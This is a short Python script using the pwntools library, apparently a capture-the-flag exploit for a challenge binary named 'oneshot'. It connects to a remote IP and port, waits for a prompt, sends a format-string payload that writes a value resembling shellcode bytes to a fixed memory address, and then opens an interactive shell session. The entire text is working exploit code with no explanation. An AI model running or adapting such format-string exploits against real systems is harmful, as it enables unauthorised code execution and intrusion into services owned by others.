
from pwn import *

context.clear(arch='i386')

# p = process('./oneshot')
p = remote('35.222.174.178', 5555)

p.recvuntil('shot: ')

p.sendline(fmtstr_payload(11, {0xF77FF000: 0x6850c031}))

p.interactive()
